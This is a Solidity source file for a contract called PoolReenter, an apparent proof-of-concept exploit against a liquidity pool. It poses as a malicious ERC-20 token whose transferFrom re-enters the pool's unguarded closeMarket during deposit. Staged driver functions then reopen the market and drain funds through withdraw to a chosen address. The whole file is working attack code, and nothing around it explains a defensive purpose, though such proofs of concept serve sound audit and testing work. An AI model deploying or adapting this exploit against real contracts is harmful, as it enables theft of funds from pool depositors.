// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IPoolX {
    function openMarket(uint256 id, address base, address quote, uint16 feeBps) external;
    function closeMarket(uint256 id) external;
    function deposit(uint256 id, uint256 a, uint256 b) external;
    function withdraw(uint256 id, uint256 a, uint256 b, address to) external;
}

/// A contract that is BOTH the NFT holder and a hostile ERC-20.
/// Its transferFrom re-enters Pool.closeMarket, which carries no reentrancy
/// guard of its own, while Pool.deposit's guard is already held.
contract PoolReenter {
    IPoolX public pool;
    uint256 public id;
    bool public armed;
    mapping(address => uint256) public balanceOf;
    string public name = "MALI";
    string public symbol = "MALI";
    uint8 public decimals = 18;

    function wire(address p, uint256 i) external { pool = IPoolX(p); id = i; }
    function arm(bool v) external { armed = v; }

    function approve(address, uint256) external pure returns (bool) { return true; }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    /// The pool calls this from inside deposit(); we credit the pool so the
    /// balance-delta check passes, then re-enter closeMarket.
    function transferFrom(address, address to, uint256 amt) external returns (bool) {
        balanceOf[to] += amt;
        if (armed) {
            armed = false;
            pool.closeMarket(id);          // <-- re-entry, no guard on this path
        }
        return true;
    }

    /*── driver ──*/
    function step1_open(address base, address quote) external {
        pool.openMarket(id, base, quote, 0);
    }
    function step2_depositAndClose(uint256 amt) external {
        armed = true;
        pool.deposit(id, amt, 0);
    }
    function step3_reopen(address base, address quote) external {
        pool.openMarket(id, base, quote, 0);
    }
    function step4_drain(uint256 amt, address to) external {
        pool.withdraw(id, amt, 0, to);
    }

    function onERC721Received(address, address, uint256, bytes calldata)
        external pure returns (bytes4)
    {
        return this.onERC721Received.selector;
    }
}